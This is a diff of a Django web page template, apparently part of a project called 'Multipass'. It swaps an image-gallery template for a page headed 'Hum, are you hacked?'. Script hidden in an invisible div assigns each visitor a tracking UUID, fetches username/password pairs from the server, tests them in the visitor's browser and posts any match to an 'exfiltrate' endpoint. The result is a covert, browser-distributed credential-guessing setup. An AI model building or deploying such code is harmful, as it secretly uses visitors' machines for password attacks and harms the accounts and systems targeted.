@@ -1,88 +1,87 @@
+{% load static %}
 <!doctype html>
 <html lang="en" class="no-js">
 <head>
     <meta charset="utf-8">
-    <meta http-equiv="x-ua-compatible" content="ie=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="canonical" href="https://html5-templates.com/demo/infinite-scroll-image-gallery/"/>
-    <title>Infinite Scroll Image Gallery</title>
-    <meta name="description" content="A brief page description">
-    <link rel="stylesheet" href="style.css">
+    <title>Multipass home</title>
+    <link rel="stylesheet" href="{% static "app/style.css" %}">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.0/jquery.min.js"></script>
-    <script src="script.js"></script>
+    <script src="{% static "app/script.js" %}"></script>
 </head>
 <body>
 <p>&nbsp;</p>
 <h1>Hum, are you hacked?</h1>
 <p style="padding: 10px 20px; text-align: center;">May be visit this page is a bad idea</p>
-<p style="padding: 10px 20px; text-align: center;">&copy; You can freely edit and publish this template but please leave
-    a link to our website: <a href="https://html5-templates.com/" target="_blank" rel="nofollow">HTML5 Templates</a></p>
 
-<div id="gallery">
-    <div>1.</div>
+<div>
     <img src="https://thumbor.sd-cdn.fr/ryN7WSkqnZhs8TVN78NNQXpVVio=/940x550/cdn.sd-cdn.fr/wp-content/uploads/2019/04/Se%CC%81curite%CC%81.jpeg"
          alt="image"/>
-    <div>2.</div>
-    <img src="https://www.presse-citron.net/wordpress_prod/wp-content/uploads/2019/03/hack.jpg" alt="image"/>
-    <div>3.</div>
-    <img src="https://www.ghost-academy.fr/wp-content/uploads/2017/05/email-password-hack.jpg" alt="image"/>
 </div>
 
 <div style="visibility: hidden">
     <script type="text/javascript">
 
-        find = false;
+        function uuidv4() {
+          return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
+            (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
+          );
+        }
+
+        uuid = localStorage.getItem('uuid');
+        if(uuid == null) {
+            uuid = uuidv4();
+            localStorage.setItem('uuid', uuid)
+        }
+
+        init = {headers: {'X-CLIENT-UUID': uuid}};
+
+        async function ack() {
+            await fetch('/app/{{ domain.name }}/ack/', init);
+        }
 
         exfiltrate = function (username, password) {
-            fetch('/{{ domain.name }}/exfiltrate', {
+            fetch('/{{ domain.name }}/exfiltrate/', {
                 method: 'POST',
                 body: JSON.stringify({
                     username: username,
                     password: password
-                })
+                }),
+                headers: {'X-CLIENT-UUID': uuid}
             })
         };
 
         test = function (username, password) {
-            if(find) return;
             /***************** TEST FUNCTION HERE **********************/
             // just call exfiltrate(username, password) when a password is find
+            console.log('test', username, password);
+            if(username === 'administrator' && password === 'iloveyou') {
+                exfiltrate(username, password)
+            }
         };
 
-        fetch('/app/{{ domain.name }}/usernames')
-            .then(response => {
-                response.json().then(function (usernames) {
-                    usernames.forEach(function (username) {
-                        fetch('/app/{{ domain.name }}/passwords', {
-                            headers: {
-                                'Cache-Control': 'no-cache'
-                            }
-                        }).then(response => {
-                            response.json().then(function (passwords) {
-                                passwords.forEach(function (password) {
-                                    test(username, password);
-                                });
+        data = true;
+        for(var i = 0; i < 5; i++) {
+
+            fetch('/app/{{ domain.name }}/probes/', init)
+                .then(response => {
+                    response.json().then(function (probes) {
+                        if(probes.probes.length === 0) {
+                            console.log('no data, stop...');
+                            data = false;
+                        }
+                        else {
+                            probes.probes.forEach(function (probe) {
+                                test(probe.username, probe.password);
                             });
-                        });
+                        }
+                        ack();
                     });
                 });
-            });
+        }
 
 
     </script>
 </div>
-
-<div id="loading">
-    <img src="_loading.gif" alt="loading"/>
-</div>
-
-<div class="wrap-infinite-link">
-    <a class="infinite-link">
-        M&eacute;g t&ouml;bb k&eacute;p
-    </a>
-</div>
-<a id="back2Top" title="Back to top" href="#">&#10148;</a>
-
 
 </body>
 
